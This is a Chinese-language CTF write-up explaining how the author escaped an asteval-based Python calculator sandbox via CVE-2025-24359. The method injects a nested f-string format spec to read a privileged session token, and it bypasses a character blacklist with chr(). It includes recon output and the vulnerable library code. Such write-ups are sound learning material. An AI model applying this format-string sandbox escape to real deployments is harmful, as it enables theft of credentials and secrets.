# SO EZ MISC

## 題目描述

Your workbook is `WB`.

ps. The bug has no patch.

`nc chal.thjcc.org 9006`

## 解題思路

先隨便送 payload 試試看

```text
calc> WB
Workbook(name='Q3-Financials', sheets={'summary': Sheet(title='Summary', owner=User(name='guest',
role='viewer', session=Session(id='sess-0000', token=<Secret value=***REDACTED***>)), cells={'A1':
42, 'A2': 1337}), 'audit': Sheet(title='Audit Trail', owner=User(name='auditor', role='root',
session=Session(id='sess-c0ffee', token=<Secret value=***REDACTED***>)), cells={'A1': 0})})

calc> WB.sheets
error: Attribute not supported
calc> WB.sheets["audit"]
error: banned character '['
calc> __import__
error: banned character '_'
```

可以發現他黑名單 `_ [ ]`、屬性讀取被移除、`lambda / if / for / while / import / try` 等被停用，symtable 只有 `str int float bool abs min max sum len round chr ord WB True False None`

目標很明顯就是 `audit` 那張表的 `token`，但屬性讀不到、索引也打不出來。

之後送這個 `\xff\xfe\x01\n`（原始的非 UTF-8 位元組，讓錯誤處理路徑自己爆炸），結果得到伺服器噴的錯誤

```text
File "/usr/local/lib/python3.13/site-packages/asteval/asteval.py", line 277, in parse
File "/srv/server.py", line 107, in evaluate
    result = interp(src, raise_errors=False)
UnicodeEncodeError: 'utf-8' codec can't encode characters in position 0-1: surrogates not allowed
```

題目說 "The bug has no patch"，asteval 相關的洞就是 `CVE-2025-24359`

去翻 `asteval/asteval.py`：

```python
def on_formattedvalue(self, node): # ('value', 'conversion', 'format_spec')
    val = self.run(node.value)
    ...
    fmt = '{__fstring__}'
    if node.format_spec is not None:
        fmt = f'{{__fstring__:{self.run(node.format_spec)}}}'   # <- 字串串接
    return safe_format(fmt, self.raise_exception, node, __fstring__=val)
```

重點在 `f"{WB:{p}}"` 這種巢狀 format spec：asteval 會先把 `p` 求值出來，再把結果**當成純文字**塞進模板字串，然後丟給 `str.format`。

所以只要 `p` 以 `}` 開頭，就能把原本的欄位提前閉合，後面愛寫什麼 format field 就寫什麼。令

```text
p = "}{__fstring__.sheets[audit].owner.session.token.value"
```

模板就變成

```text
{__fstring__:}{__fstring__.sheets[audit].owner.session.token.value}
```

第一個欄位用空 spec 收掉，第二個欄位是我們自己插進去的。

再看 `astutils.SafeFormatter.get_field`，它只擋屬性，索引完全放行：

```python
for is_attr, i in rest:
    if is_attr:
        obj = safe_getattr(obj, i, self.raise_exc, self.node)   # 只擋 dunder / UNSAFE_ATTRS
    else:
        obj = obj[i]                                            # 無檢查
```

`sheets` / `owner` / `session` / `token` / `value` 都不是 dunder，安全檢查放行；`[audit]` 走的是完全沒檢查的索引分支。等於整條屬性/索引走訪能力又拿回來了。

至於被黑名單擋掉的 `_` `[` `]`，用 `chr(95)` / `chr(91)` / `chr(93)` 組出來就好，原始碼裡一個都不會出現。

最後把 exploit 寫成兩行送進去就有 flag 了

## Flag

```text
THJCC{CVE_2025_24359_th3_p4tch_w4s_1nc0mpl3t3:/}
```
